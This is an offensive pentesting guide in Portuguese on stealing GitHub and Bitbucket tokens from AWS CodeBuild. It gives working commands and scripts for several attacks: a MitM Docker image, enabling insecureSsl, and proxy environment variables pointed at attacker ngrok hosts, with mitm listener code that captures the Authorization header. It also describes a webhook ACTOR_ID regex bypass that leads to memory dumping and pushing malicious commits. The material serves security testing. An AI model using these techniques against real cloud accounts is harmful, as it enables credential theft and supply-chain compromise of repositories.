# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Recuperar tokens configurados do Github/Bitbucket

Primeiro, verifique se há credenciais de origem configuradas que você poderia leak:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Se você descobrir que a autenticação, por exemplo para o Github, está configurada na conta, você pode **exfiltrate** esse **access** (**GH token or OAuth token**) fazendo o Codebuild **use an specific docker image** para executar o build do projeto.

Para isso você pode **create a new Codebuild project** ou alterar o **environment** de um já existente para definir a **Docker image**.

A Docker image que você pode usar é [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Esta é uma Docker image muito básica que irá setar as **env variables `https_proxy`**, **`http_proxy`** e **`SSL_CERT_FILE`**. Isso permitirá interceptar a maior parte do tráfego do host indicado em **`https_proxy`** e **`http_proxy`** e confiar no SSL CERT indicado em **`SSL_CERT_FILE`**.

1. **Create & Upload your own Docker MitM image**
- Siga as instruções do repo para configurar o endereço IP do seu proxy, definir seu SSL cert e **build the docker image**.
- **DO NOT SET `http_proxy`** para não interceptar requisições ao metadata endpoint.
- Você pode usar **`ngrok`** como `ngrok tcp 4444` para setar o proxy para o seu host
- Uma vez que a Docker image esteja construída, **upload it to a public repo** (Dockerhub, ECR...)
2. **Set the environment**
- Crie um **novo projeto Codebuild** ou modifique o **environment** de um existente.
- Configure o projeto para usar a **Docker image gerada anteriormente**

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

- Como indicado no **Github repo** você pode usar algo como:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> A versão do **mitmproxy usada foi 9.0.1**, foi relatado que com a versão 10 isso pode não funcionar.

4. **Execute o build & capture as credenciais**

- Você pode ver o token no cabeçalho **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Isso também pode ser feito a partir do aws cli com algo como
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Via insecureSSL

Os projetos do **Codebuild** têm uma configuração chamada **`insecureSsl`** que está oculta na interface web; você só pode alterá-la pela API.\
Habilitar isso permite que o Codebuild conecte-se ao repositório **sem verificar o certificado** oferecido pela plataforma.

- Primeiro, você precisa enumerar a configuração atual com algo como:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Então, com as informações coletadas você pode atualizar a configuração do projeto **`insecureSsl`** para **`True`**. Abaixo está um exemplo de minha atualização de um projeto, repare no **`insecureSsl=True`** ao final (esta é a única coisa que você precisa alterar na configuração coletada).
- Além disso, adicione também as variáveis de ambiente **http_proxy** e **https_proxy** apontando para seu tcp ngrok assim:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Então, execute o exemplo básico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) na porta indicada pelas variáveis de proxy (http_proxy e https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Finalmente, clique em **Build the project**, as **credenciais** serão **enviadas em texto claro** (base64) para a porta do mitm:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Via protocolo HTTP~~

> [!TIP] > **Esta vulnerabilidade foi corrigida pela AWS em algum momento na semana de 20 de fev de 2023 (acho que na sexta-feira). Portanto um atacante não pode mais abusar dela :)**

Um atacante com **permissões elevadas em um CodeBuild poderia leak o token do Github/Bitbucket configurado ou, se as permissões foram configuradas via OAuth, o **token OAuth temporário usado para acessar o código**.

- Um atacante poderia adicionar as variáveis de ambiente **http_proxy** e **https_proxy** ao projeto CodeBuild apontando para sua máquina (por exemplo `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Em seguida, altere a URL do repositório github para usar HTTP em vez de HTTPS, por exemplo: `http://github.com/carlospolop-forks/TestActions`
- Em seguida, execute o exemplo básico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) na porta indicada pelas variáveis de proxy (http_proxy e https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Em seguida, clique em **Build the project** ou inicie o build a partir da linha de comando:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Finalmente, as **credenciais** serão **enviadas em texto claro** (base64) para a porta mitm:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Agora um atacante poderá usar o token a partir de sua máquina, listar todos os privilégios que ele possui e (ab)usar de forma mais fácil do que usar o serviço CodeBuild diretamente.

## Filtro de webhook ACTOR_ID regex allowlist bypass (builds privilegiados acionados por PR)

Webhooks do CodeBuild no GitHub mal configurados que usam regexes `ACTOR_ID` não ancoradas permitem que PRs *não confiáveis* iniciem builds privilegiados. Se a allowlist for algo como `123456|7890123` sem `^`/`$`, qualquer ID que contenha uma dessas substrings corresponde. Como os IDs de usuário do GitHub são sequenciais, um atacante pode competir para registrar um ID “eclipsante” (uma superstring de um ID confiável) e acionar o build.

**Caminho do exploit**

1. Encontre projetos públicos do CodeBuild que exponham filtros de webhook e extraia uma allowlist `ACTOR_ID` não ancorada.
2. Obtenha um ID de GitHub eclipsante:
- Amasotre o contador global de IDs criando/excluindo orgs do GitHub (org IDs compartilham o pool).
- Pré-posicione muitas criações de manifest de GitHub App e dispare as URLs de confirmação quando o contador estiver dentro de ~100 IDs do alvo para registrar em massa um bot ID contendo a substring confiável.
3. Abra um PR a partir da conta eclipsante; a regex corresponde à substring e o build privilegiado é executado.
4. Use build RCE (por exemplo, hooks de instalação de dependências) para despejar a memória do processo que manipula a credencial do GitHub e recuperar o token PAT/OAuth.
5. Com o escopo `repo` do token, convide sua conta como colaborador/admin e faça push/approve de commits maliciosos ou exfiltre segredos.

## Referências
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
